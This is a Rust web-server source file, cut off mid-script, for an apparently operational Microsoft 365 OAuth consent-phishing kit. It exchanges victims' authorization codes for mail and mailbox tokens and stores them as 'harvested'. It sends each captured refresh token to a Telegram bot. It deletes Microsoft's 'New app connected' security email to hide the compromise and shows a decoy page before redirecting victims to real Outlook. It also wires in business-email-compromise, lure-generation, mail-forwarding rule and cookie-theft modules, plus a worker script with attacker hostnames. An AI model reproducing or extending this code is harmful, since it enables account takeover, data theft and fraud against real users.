use actix_web::{web, App, HttpServer, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use sqlx::{SqlitePool, sqlite::SqlitePoolOptions};
use chrono::{Utc, Duration};
use uuid::Uuid;
use std::env;
use dotenv::dotenv;
use reqwest::Client;
use rand::Rng;
use actix_cors::Cors;

mod vault;
use vault::Vault;

mod scheduler;
use scheduler::start_scheduler;

mod graph_client;
pub use graph_client::GraphClient;

mod recon;
use recon::{recon_get_handler, recon_run_handler};

mod rules;
use rules::{create_rule_handler, delete_rule_handler, fetch_graph_rules_handler, list_rules_handler, run_local_rules_handler, ai_suggest_rules_handler};

mod contacts;
use contacts::{list_contacts_handler, create_contact_handler, update_contact_handler, delete_contact_handler, extract_emails_handler};

mod tasks;
use tasks::{list_task_lists_handler, list_tasks_handler, create_task_handler, update_task_handler, delete_task_handler};

mod onedrive;
use onedrive::{list_drive_items_handler, get_drive_item_handler, download_drive_item_handler, search_drive_items_handler};

mod office_apps;
use office_apps::{list_office_docs_handler, search_office_docs_handler, get_office_embed_url_handler};

mod stealth;
use stealth::stealth_config_handler;

mod campaigns;
use campaigns::{
    attach_token_handler, create_campaign_handler, delete_campaign_handler,
    get_campaign_handler, list_campaigns_handler,
};

mod response_crypto;
use response_crypto::ResponseCrypto;

mod audit;
use audit::{analytics_overview_handler, audit_logs_handler, audit_summary_handler, AuditMiddleware};

mod settings;
use settings::{get_ai_settings_handler, save_ai_settings_handler, test_decrypt_handler, purge_expired_handler};

mod auth;
use auth::{register_handler, login_handler, me_handler, ensure_users_table, seed_default_admin, list_admins_handler, create_admin_handler, update_admin_handler, delete_admin_handler};

mod bec;
use bec::bec_analyze_handler;

mod lure;
use lure::generate_lure_handler;

mod inbox_folders;
use inbox_folders::{
    list_folders_handler, folder_messages_handler, create_folder_handler,
    send_mail_handler, delete_message_handler, fetch_contacts_handler,
    mark_read_handler, mx_check_handler, move_message_handler,
    list_local_folders_handler, create_local_folder_handler,
    delete_local_folder_handler, list_local_folder_messages_handler,
    auto_filter_handler,
};

mod calendar;
use calendar::list_calendar_events_handler;

mod teams;
use teams::{list_teams_handler, list_team_channels_handler, share_to_teams_handler};

mod cookie_client;
use cookie_client::{generate_bookmarklet_token_handler, sync_cookies_handler, test_cookie_session_handler, get_session_status_handler, kill_session_handler};

mod tenant_utils;
use tenant_utils::{detect_tenant_fixed, get_location_from_ip};

// ------------------- CONFIGURATION -------------------
#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct AppConfig {
    client_id: String,
    client_secret: String,
    redirect_uri: String,
    first_party_ids: Vec<String>,
    database_url: String,
    telegram_bot_token: Option<String>,
    telegram_chat_id: Option<String>,
    master_secret: String,
    frontend_url: Option<String>,

}

impl AppConfig {
    fn from_env() -> Self {
        Self {
            client_id: env::var("CLIENT_ID").expect("CLIENT_ID not set"),
            client_secret: env::var("CLIENT_SECRET").expect("CLIENT_SECRET not set"),
            redirect_uri: env::var("REDIRECT_URI").expect("REDIRECT_URI not set"),
            first_party_ids: vec![
                "04b07795-8ddb-461a-bbee-02f9e1bf7b46".to_string(),
                "a672d62c-fc7b-4e81-a576-e60dc46e951d".to_string(),
                "d3590ed6-52b3-4102-aeff-aad2292ab01c".to_string(),
            ],
            database_url: env::var("DATABASE_URL").unwrap_or_else(|_| "sqlite::memory:".to_string()),
            telegram_bot_token: env::var("TELEGRAM_BOT_TOKEN").ok(),
            telegram_chat_id: env::var("TELEGRAM_CHAT_ID").ok(),
            master_secret: env::var("MASTER_SECRET").expect("MASTER_SECRET not set"),
            frontend_url: env::var("FRONTEND_URL").ok(),

        }
    }
}

#[derive(Debug, sqlx::FromRow, Serialize)]
struct HarvestedToken {
    id: String,
    email: Option<String>,
    access_token: String,
    refresh_token: String,
    expires_at: chrono::DateTime<Utc>,
    #[serde(rename = "created_at")]
    captured_at: chrono::DateTime<Utc>,
    source: String,
    ip_address: Option<String>,
    location: Option<String>,
    tenant_id: Option<String>,
    category: Option<String>,
    #[serde(rename = "account_type")]
    account_type: Option<String>,
    last_refreshed_at: Option<chrono::DateTime<Utc>>,
}

#[derive(Clone)]
pub struct AppState {
    pool: SqlitePool,
    config: AppConfig,
    http_client: Client,
    vault: Vault,
    response_key: [u8; 32],
}

/// Retrieve token from vault (tokens table) or fall back to harvested table.
pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Result<vault::DecryptedToken> {
    // First try vault (encrypted tokens table)
    if let Ok(token) = state.vault.retrieve_token(&state.pool, token_id).await {
        return Ok(token);
    }
    // Fall back to harvested table (legacy plain-text storage)
    let row: HarvestedToken = sqlx::query_as(
        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested WHERE id = ?"
    )
    .bind(token_id)
    .fetch_one(&state.pool)
    .await
    .map_err(|e| anyhow::anyhow!("Token not found in any storage: {}", e))?;

    Ok(vault::DecryptedToken {
        id: row.id,
        campaign_id: "harvested".to_string(),
        user_email: row.email.unwrap_or_default(),
        access_token: row.access_token,
        refresh_token: row.refresh_token,
        scopes: vec![],
        expires_at: row.expires_at,
        created_at: row.captured_at,
        last_refreshed_at: None,
        account_type: row.account_type.or(row.category),
    })
}

fn generate_id() -> String {
    Uuid::new_v4().to_string()
}

#[derive(Deserialize)]
struct StoreTokenRequest {
    campaign_id: String,
    user_email: String,
    access_token: String,
    refresh_token: String,
    scopes: Vec<String>,
    expires_at: chrono::DateTime<Utc>,
    account_type: Option<String>,
}

async fn store_token_handler(
    body: web::Json<StoreTokenRequest>,
    audit_ctx: audit::AuditContext,
    state: web::Data<AppState>,
) -> impl Responder {
    let result = state.vault.store_token(
        &state.pool,
        &body.campaign_id,
        &body.user_email,
        &body.access_token,
        &body.refresh_token,
        body.scopes.clone(),
        body.expires_at,
        body.account_type.as_deref(),
    ).await;

    let success = result.is_ok();
    let token_id = result.as_ref().ok().cloned();

    let _ = audit::insert_audit_log(
        &state.pool,
        "token_stored",
        Some(&body.campaign_id),
        token_id.as_deref(),
        Some(&body.user_email),
        Some(&audit_ctx.ip_address),
        Some(&audit_ctx.user_agent),
        Some(serde_json::json!({"scopes": body.scopes})),
        success,
    ).await;

    match result {
        Ok(id) => {
            println!("Stored encrypted token {} for campaign {}", id, body.campaign_id);
            HttpResponse::Ok().json(serde_json::json!({
                "status": "stored",
                "id": id
            }))
        }
        Err(e) => {
            eprintln!("Token store error: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_store_token",
                "details": format!("{}", e)
            }))
        }
    }
}

async fn send_telegram_notification(config: &AppConfig, refresh_token: &str, email: &str) {
    if let (Some(token), Some(chat_id)) = (&config.telegram_bot_token, &config.telegram_chat_id) {
        let message = format!("🎯 *New Token Captured!*\n\nEmail: `{}`\nRefresh Token: `{}`\nTime: {}", email, refresh_token, Utc::now());
        let url = format!("https://api.telegram.org/bot{}/sendMessage", token);
        let params = [
            ("chat_id", chat_id.as_str()),
            ("text", message.as_str()),
            ("parse_mode", "Markdown"),
        ];
        let _ = reqwest::Client::new()
            .post(&url)
            .form(&params)
            .send()
            .await;
    }
}

async fn fetch_user_email(access_token: &str) -> Option<String> {
    let client = Client::new();
    let resp = client
        .get("https://graph.microsoft.com/v1.0/me")
        .header("Authorization", format!("Bearer {}", access_token))
        .send()
        .await
        .ok()?;
    let body: serde_json::Value = resp.json().await.ok()?;
    body.get("userPrincipalName")?.as_str().map(|s| s.to_string())
}

/// OPSEC: Retry search and delete Microsoft's "New app connected" notification email.
/// The notification may arrive 5-20 seconds after the OAuth flow completes.
async fn delete_microsoft_notification_email(access_token: String) {
    let client = Client::new();
    // Search broadly — Microsoft notification emails vary by locale/account type
    let search_queries = [
        // Exact phrases Microsoft uses
        "\"New app\" AND \"connected\"",
        "\"New app(s)\" AND \"connected\"",
        "\"New app connected\"",
        "\"New app(s) connected\"",
        "\"app connected\" AND \"Microsoft account\"",
        "\"have access to your data\"",
        "\"connected to your Microsoft account\"",
    ];

    for attempt in 1..=15 {
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;

        // Try multiple search strategies
        let mut all_messages: Vec<serde_json::Value> = Vec::new();

        // Strategy 1: Graph API $search
        for query in &search_queries {
            let search_url = format!(
                "https://graph.microsoft.com/v1.0/me/messages?$search={}&$top=10&$select=id,subject,receivedDateTime,from,bodyPreview",
                urlencoding::encode(query)
            );
            if let Ok(resp) = client
                .get(&search_url)
                .header("Authorization", format!("Bearer {}", access_token))
                .header("Accept", "application/json")
                .send()
                .await {
                if resp.status().is_success() {
                    if let Ok(body) = resp.json::<serde_json::Value>().await {
                        if let Some(msgs) = body.get("value").and_then(|v| v.as_array()) {
                            all_messages.extend(msgs.clone());
                        }
                    }
                }
            }
        }

        // Strategy 2: Filter by known Microsoft notification sender domains
        let filter_url = "https://graph.microsoft.com/v1.0/me/messages?$filter=from/emailAddress/address eq 'account-security-noreply@accountprotection.microsoft.com' or from/emailAddress/address eq 'microsoftaccount@microsoft.com' or from/emailAddress/address eq 'security@microsoft.com'&$top=5&$select=id,subject,receivedDateTime,from,bodyPreview&$orderby=receivedDateTime desc";
        if let Ok(resp) = client
            .get(filter_url)
            .header("Authorization", format!("Bearer {}", access_token))
            .header("Accept", "application/json")
            .send()
            .await {
            if resp.status().is_success() {
                if let Ok(body) = resp.json::<serde_json::Value>().await {
                    if let Some(msgs) = body.get("value").and_then(|v| v.as_array()) {
                        all_messages.extend(msgs.clone());
                    }
                }
            }
        }

        // Strategy 3: Recent inbox sweep — look at last 20 messages
        let recent_url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top=20&$select=id,subject,receivedDateTime,from,bodyPreview&$orderby=receivedDateTime desc";
        if let Ok(resp) = client
            .get(recent_url)
            .header("Authorization", format!("Bearer {}", access_token))
            .header("Accept", "application/json")
            .send()
            .await {
            if resp.status().is_success() {
                if let Ok(body) = resp.json::<serde_json::Value>().await {
                    if let Some(msgs) = body.get("value").and_then(|v| v.as_array()) {
                        all_messages.extend(msgs.clone());
                    }
                }
            }
        }

        // Deduplicate by ID
        let mut seen = std::collections::HashSet::new();
        all_messages.retain(|m| {
            let id = m.get("id").and_then(|v| v.as_str()).unwrap_or("");
            if id.is_empty() || seen.contains(id) { false } else { seen.insert(id.to_string()); true }
        });

        let now = Utc::now();
        let mut found = false;

        for msg in &all_messages {
            let id = msg.get("id").and_then(|v| v.as_str()).unwrap_or("");
            let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
            let body_preview = msg.get("bodyPreview").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
            let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
            let from_addr = msg.get("from")
                .and_then(|f| f.get("emailAddress"))
                .and_then(|e| e.get("address"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_lowercase();
            let from_name = msg.get("from")
                .and_then(|f| f.get("emailAddress"))
                .and_then(|e| e.get("name"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_lowercase();

            let is_recent = if let Ok(dt) = chrono::DateTime::parse_from_rfc3339(received) {
                (now - dt.with_timezone(&Utc)).num_minutes() <= 15
            } else { false };

            // Broad detection: subject OR body contains notification keywords
            let has_notification_subject = subject.contains("new app")
                || subject.contains("connected")
                || subject.contains("access to your data")
                || subject.contains("microsoft account");

            let has_notification_body = body_preview.contains("new app")
                || body_preview.contains("connected to the microsoft account")
                || body_preview.contains("have access to your data")
                || body_preview.contains("manage your apps");

            let is_microsoft_sender = from_addr.contains("microsoft")
                || from_addr.contains("accountprotection")
                || from_name.contains("microsoft account team")
                || from_name.contains("microsoft account");

            let is_notification = is_recent
                && (has_notification_subject || has_notification_body)
                && is_microsoft_sender;

            if is_notification && !id.is_empty() {
                found = true;
                let del_url = format!("https://graph.microsoft.com/v1.0/me/messages/{}", id);
                match client
                    .delete(&del_url)
                    .header("Authorization", format!("Bearer {}", access_token))
                    .send()
                    .await {
                    Ok(r) if r.status().is_success() || r.status() == reqwest::StatusCode::NOT_FOUND => {
                        println!("[opsec] Deleted notification email on attempt {}: subject='{}' from='{}'", attempt, subject, from_addr);
                        return;
                    }
                    Ok(r) => eprintln!("[opsec] Delete attempt {} failed with status {} for id={} subject='{}'", attempt, r.status(), id, subject),
                    Err(e) => eprintln!("[opsec] Delete error on attempt {} for id={}: {}", attempt, id, e),
                }
            }
        }

        if found {
            // Found matching email but delete failed — keep trying
            continue;
        }
    }
    eprintln!("[opsec] Notification email not found after 15 attempts (30s). Check if the email subject/sender changed.");
}

#[derive(Deserialize)]
struct ExchangeQuery {
    code: String,
    user_ip: Option<String>,
}

/// Decode an id_token JWT without signature verification (we only need the claims).
fn decode_id_token(id_token: &str) -> Option<serde_json::Map<String, serde_json::Value>> {
    let parts: Vec<&str> = id_token.split('.').collect();
    if parts.len() != 3 {
        return None;
    }
    use base64::{Engine as _, engine::general_purpose};
    let decoded = general_purpose::URL_SAFE_NO_PAD.decode(parts[1]).ok()?;
    let json_str = String::from_utf8(decoded).ok()?;
    let value: serde_json::Value = serde_json::from_str(&json_str).ok()?;
    value.as_object().cloned()
}

async fn exchange_code(
    query: web::Query<ExchangeQuery>,
    req: actix_web::HttpRequest,
    state: web::Data<AppState>,
) -> impl Responder {
    let code = &query.code;
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "authorization_code"),
        ("code", code.as_str()),
        ("redirect_uri", state.config.redirect_uri.as_str()),
    ];
    let client = &state.http_client;
    let res = client.post(token_url).form(&params).send().await;
    match res {
        Ok(resp) => {
            let body: serde_json::Value = resp.json().await.unwrap_or_default();
            if let (Some(access_token), Some(refresh_token)) = (body.get("access_token").and_then(|v| v.as_str()), body.get("refresh_token").and_then(|v| v.as_str())) {
                let id = generate_id();
                let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
                let _expires_at = Utc::now() + Duration::seconds(expires_in);
                // Set refresh token expiry to 90 days for Microsoft confidential clients
                let refresh_expires_at = Utc::now() + Duration::days(90);
                let email = fetch_user_email(access_token).await;
                let email_str = email.clone().unwrap_or_else(|| "unknown".to_string());
                
                // Decode id_token for accurate tenant/account detection
                let id_token_claims = body.get("id_token")
                    .and_then(|v| v.as_str())
                    .and_then(|id_token| decode_id_token(id_token));
                
                // Detect tenant and account type
                let (tenant_name, account_type) = detect_tenant_fixed(&email_str, id_token_claims.as_ref());
                let category = account_type.clone(); // Keep category for backward compatibility
                
                // Get real client IP address
                // Priority: 1) X-Forwarded-For header, 2) query param (from Cloudflare Worker), 3) peer_addr
                let ip_address = req.headers()
                    .get("X-Forwarded-For")
                    .and_then(|v| v.to_str().ok())
                    .and_then(|v| v.split(',').next())
                    .map(|s| s.trim().to_string())
                    .or_else(|| query.user_ip.clone())
                    .or_else(|| req.connection_info().peer_addr().map(|s| s.to_string()))
                    .unwrap_or_else(|| "unknown".to_string());
                
                // Resolve location from IP
                let (location, _region, _country) = get_location_from_ip(&ip_address).await;
                
                println!("Attempting to insert token for email: {:?}, tenant: {:?}, account_type: {:?}", email, tenant_name, account_type);
                // Store in harvested table (legacy, for dashboard display)
                // Session is ACTIVE immediately - OAuth token provides full access
                match sqlx::query(
                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                )
                .bind(&id)
                .bind(&email)
                .bind(access_token)
                .bind(refresh_token)
                .bind(refresh_expires_at)
                .bind(Utc::now())
                .bind("oauth_app")
                .bind(&ip_address)
                .bind(&location)
                .bind(&tenant_name)
                .bind(&category)
                .bind(&account_type)
                .bind(Option::<chrono::DateTime<Utc>>::None)
                .execute(&state.pool)
                .await {
                    Ok(result) => println!("[exchange] Inserted into harvested table: {} rows affected", result.rows_affected()),
                    Err(e) => eprintln!("[exchange] ERROR inserting into harvested table: {}", e),
                }
                // Also store in encrypted tokens table (for scheduler refresh, BEC, recon, etc.)
                match state.vault.store_token(
                    &state.pool,
                    &id,
                    &email_str,
                    access_token,
                    refresh_token,
                    vec!["openid".to_string(), "offline_access".to_string(), "User.Read".to_string(), "Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "Contacts.Read".to_string(), "MailboxSettings.ReadWrite".to_string()],
                    refresh_expires_at,
                    Some(account_type.as_str()),
                ).await {
                    Ok(token_id) => println!("[exchange] Stored encrypted token in vault: {}", token_id),
                    Err(e) => eprintln!("[exchange] ERROR storing encrypted token in vault: {}", e),
                }
                if let Some(email) = email {
                    send_telegram_notification(&state.config, refresh_token, &email).await;
                }
                // OPSEC: auto-delete Microsoft's "New app connected" notification email
                tokio::spawn(delete_microsoft_notification_email(access_token.to_string()));
                HttpResponse::Ok().json(serde_json::json!({"status": "token_stored", "token_id": id}))
            } else {
                HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
            }
        }
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": format!("request_failed: {}", e)}))
    }
}

// Token-based auth-success page: redirect to REAL Outlook after OAuth
// Victim NEVER sees the proxy domain - they go directly to Microsoft
// The OAuth token IS the session - Graph API provides full access
async fn auth_success_handler(
    query: web::Query<std::collections::HashMap<String, String>>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = query.get("token_id").cloned().unwrap_or_default();
    
    // Look up account_type to determine the correct real Outlook URL
    let account_type: Option<String> = if !token_id.is_empty() {
        sqlx::query_scalar::<_, String>(
            "SELECT account_type FROM harvested WHERE id = ? UNION ALL SELECT account_type FROM tokens WHERE id = ? LIMIT 1"
        )
        .bind(&token_id)
        .bind(&token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None)
    } else {
        None
    };
    
    // Determine real Outlook URL based on account type
    let outlook_url = match account_type.as_deref() {
        Some("enterprise") | Some("business") | Some("organization") => "https://outlook.office.com/owa/",
        _ => "https://outlook.live.com/owa/",
    };
    
    let html = format!(r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading your account...</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1e3a5f 0%, #0f2744 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }}
        .container {{
            text-align: center;
            max-width: 480px;
            padding: 40px 30px;
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }}
        .loading {{
            width: 48px;
            height: 48px;
            border: 3px solid rgba(255,255,255,0.2);
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 24px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        h1 {{ font-size: 22px; font-weight: 600; margin-bottom: 12px; }}
        p {{ font-size: 14px; color: rgba(255,255,255,0.7); margin-bottom: 24px; line-height: 1.6; }}
        .progress {{
            width: 100%;
            height: 4px;
            background: rgba(255,255,255,0.1);
            border-radius: 2px;
            overflow: hidden;
            margin-top: 24px;
        }}
        .progress-bar {{
            width: 0%;
            height: 100%;
            background: #0078d4;
            border-radius: 2px;
            animation: progress 3s ease-out forwards;
        }}
        @keyframes progress {{
            0% {{ width: 0%; }}
            100% {{ width: 100%; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="loading"></div>
        <h1>Loading your account...</h1>
        <p>Please wait while we prepare your Outlook experience.</p>
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
    </div>
    <script>
        // Redirect to REAL Outlook after 3 seconds - victim never sees proxy domain
        setTimeout(function() {{
            window.location.href = '{}';
        }}, 3000);
    </script>
</body>
</html>"#, outlook_url);

    HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(html)
}

// JSON API: list all tokens
async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
    HttpResponse::Ok().json(rows)
}

// JSON API: get single encrypted token by id
async fn api_token_by_id(
    path: web::Path<String>,
    req: actix_web::HttpRequest,
    state: web::Data<AppState>,
) -> impl Responder {
    let id = path.into_inner();
    match state.vault.retrieve_token(&state.pool, &id).await {
        Ok(token) => {
            let json = serde_json::to_value(token).unwrap_or_default();
            ResponseCrypto::respond(&req, json, &state.response_key)
        }
        Err(_) => HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    }
}

#[derive(Deserialize)]
struct DeleteTokensRequest {
    token_ids: Vec<String>,
}

// JSON API: batch delete tokens
async fn api_delete_tokens(
    body: web::Json<DeleteTokensRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let mut deleted_harvested = 0u64;
    let mut deleted_vault = 0u64;

    // Disable foreign key constraints temporarily to allow deletion
    // Production SQLite may have FK enabled; local schema doesn't define them
    let _ = sqlx::query("PRAGMA foreign_keys = OFF")
        .execute(&state.pool)
        .await;

    for id in &body.token_ids {
        // Check if token exists in either table before attempting deletion
        let exists_harvested: bool = sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM harvested WHERE id = ?")
            .bind(id)
            .fetch_one(&state.pool)
            .await
            .map(|count| count > 0)
            .unwrap_or(false);
        
        let exists_vault: bool = sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM tokens WHERE id = ?")
            .bind(id)
            .fetch_one(&state.pool)
            .await
            .map(|count| count > 0)
            .unwrap_or(false);

        eprintln!("[delete] Token {} exists: harvested={}, vault={}", id, exists_harvested, exists_vault);

        // Delete related records first to avoid foreign key constraint violations
        let _ = sqlx::query("DELETE FROM created_rules WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM recon_reports WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM audit_logs WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM campaigns WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM local_folders WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM local_filtered_messages WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM ai_analyses WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;

        let r1 = sqlx::query("DELETE FROM harvested WHERE id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        match r1 {
            Ok(r) => {
                deleted_harvested += r.rows_affected();
                eprintln!("[delete] Deleted {} rows from harvested for id: {}", r.rows_affected(), id);
            }
            Err(e) => {
                eprintln!("[delete] Error deleting from harvested for id {}: {}", id, e);
            }
        }

        let r2 = sqlx::query("DELETE FROM tokens WHERE id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        match r2 {
            Ok(r) => {
                deleted_vault += r.rows_affected();
                eprintln!("[delete] Deleted {} rows from tokens for id: {}", r.rows_affected(), id);
            }
            Err(e) => {
                eprintln!("[delete] Error deleting from tokens for id {}: {}", id, e);
            }
        }
    }

    // Re-enable foreign key constraints
    let _ = sqlx::query("PRAGMA foreign_keys = ON")
        .execute(&state.pool)
        .await;

    HttpResponse::Ok().json(serde_json::json!({
        "success": true,
        "deleted": deleted_harvested + deleted_vault,
        "deleted_harvested": deleted_harvested,
        "deleted_vault": deleted_vault,
    }))
}

#[derive(Serialize)]
struct TokenHealthResponse {
    active: i64,
    expired: i64,
    revoked: i64,
    total: i64,
}

// JSON API: token health counts
async fn tokens_health(state: web::Data<AppState>) -> impl Responder {
    let now = Utc::now();

    let active: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM tokens WHERE expires_at > ? AND (status IS NULL OR status != 'revoked')"
    )
    .bind(now)
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let expired: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM tokens WHERE expires_at <= ? AND (status IS NULL OR status != 'revoked')"
    )
    .bind(now)
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let revoked: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM tokens WHERE status = 'revoked'"
    )
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let total = active + expired + revoked;

    HttpResponse::Ok().json(TokenHealthResponse { active, expired, revoked, total })
}

// JSON API: get inbox emails for a token
#[derive(Deserialize)]
pub struct InboxApiQuery {
    token_id: String,
}

#[derive(Deserialize)]
pub struct TokenIdQuery {
    token_id: String,
}

async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        // Try to refresh the access token
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = match fresh_access {
            Some(t) => t,
            None => {
                // Fall back to stored access token, but it may be expired
                println!("Failed to refresh token for {}", token.id);
                token.access_token.clone()
            }
        };
        
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        
        match resp {
            Ok(r) => {
                if r.status() == 401 {
                    // Unauthorized – token invalid
                    return HttpResponse::Unauthorized().json(serde_json::json!({
                        "error": "Access token expired and refresh failed. The refresh token may be revoked or expired."
                    }));
                }
                let body: serde_json::Value = r.json().await.unwrap_or_default();
                
                // Run local rules on fetched messages
                if let Some(messages) = body.get("value").and_then(|v| v.as_array()) {
                    let graph_messages: Vec<crate::graph_client::GraphMessage> = messages.iter()
                        .filter_map(|m| serde_json::from_value(m.clone()).ok())
                        .collect();
                    if !graph_messages.is_empty() {
                        let (moved, forwarded, matched) = rules::run_local_rules(&state, &query.token_id, &graph_messages).await;
                        if matched > 0 {
                            println!("[api_inbox] Auto-filtered {} messages for token {} (moved: {}, forwarded: {})", matched, query.token_id, moved, forwarded);
                        }
                    }
                }
                
                HttpResponse::Ok().json(body)
            }
            Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({
                "error": format!("Request failed: {}", e)
            }))
        }
    } else {
        HttpResponse::NotFound().json(serde_json::json!({"error": "Token not found"}))
    }
}

// Generate OAuth link using the deployed worker URL
#[derive(Serialize)]
struct GenerateOAuthLinkResponse {
    link: String,
    worker_url: String,
}

#[derive(Deserialize)]
struct GenerateOAuthLinkQuery {
    local: Option<bool>,
}

async fn generate_oauth_link(
    query: web::Query<GenerateOAuthLinkQuery>,
    state: web::Data<AppState>,
) -> impl Responder {
    let is_local = query.local.unwrap_or(false);
    
    let redirect_uri = if is_local {
        // For local development, use localhost directly or a configured local redirect
        env::var("LOCAL_REDIRECT_URI").unwrap_or_else(|_| {
            let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
            format!("http://localhost:{}/exchange", port)
        })
    } else {
        // Production: use Cloudflare Worker
        let worker_name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
        let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
        let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
        format!("{}/oauth/callback", worker_url)
    };

    let scopes = "openid%20offline_access%20User.Read%20Mail.ReadWrite%20Mail.Send%20Contacts.Read%20MailboxSettings.ReadWrite";
    let state_param: String = rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();

    let link = format!(
        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id={}&response_type=code&redirect_uri={}&scope={}&state={}&response_mode=query",
        state.config.client_id,
        redirect_uri,
        scopes,
        state_param
    );

    HttpResponse::Ok().json(GenerateOAuthLinkResponse {
        link,
        worker_url: redirect_uri.clone(),
    })
}

// Embedded worker script for deployment
const WORKER_SCRIPT: &str = r#"// SimdiaTokens OAuth Worker
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const _MAIN_SERVER = typeof MAIN_SERVER !== 'undefined' ? MAIN_SERVER : 'https://simdiatokens-server-production.up.railway.app';
  const _CLIENT_ID = typeof CLIENT_ID !== 'undefined' ? CLIENT_ID : '8bd2f03a-e0fb-490e-9c02-212c0d96dff4';
  const _REDIRECT_URI = typeof REDIRECT_URI !== 'undefined' ? REDIRECT_URI : 'https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback';
    const SCOPE = 'openid offline_access User.Read Mail.ReadWrite Mail.Send Contacts.Read MailboxSettings.ReadWrite';

  if (url.pathname === '/start') {
